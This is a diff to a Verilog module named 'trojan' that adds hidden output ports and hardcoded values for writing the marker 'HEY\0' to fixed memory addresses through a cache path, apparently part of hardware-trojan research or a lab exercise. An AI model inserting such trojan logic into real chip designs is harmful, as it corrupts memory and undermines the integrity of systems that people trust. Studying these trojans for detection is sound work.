@@ -16,7 +16,13 @@ module trojan (
     output reg [31:0] o_uart_s_wb_adr,
     output reg        o_uart_s_wb_we,
     output reg [31:0] o_uart_s_wb_dat_w,
-    output reg        o_uart_s_wb_stb
+    output reg        o_uart_s_wb_stb,
+	
+	// Write to cache
+	output reg			o_troj,
+	output wire [31:0] 	o_troj_write_data,
+	output wire [31:0]	o_troj_write_addr,
+	output wire [31:0]  o_troj_write_addr_nxt
     );
 
     //reg  [32*8:0] data_cache;
@@ -34,6 +40,12 @@ module trojan (
 
     reg  uart_available;
     reg uart_available_nxt;
+	
+	reg cache_state = 0;
+	
+	assign o_troj_write_data 		= 32'h4845_5900;	/// "HEY\0"
+	assign o_troj_write_addr 		= 32'h3E00_0000;
+	assign o_troj_write_addr_nxt 	= 32'h3E00_0020;
     
     always @(*) begin
 
@@ -61,6 +73,8 @@ module trojan (
             o_uart_s_wb_dat_w_nxt = 0;
             o_uart_s_wb_stb_nxt = 0;
         //end
+		
+		
     end
 
     always @(posedge i_clk) begin
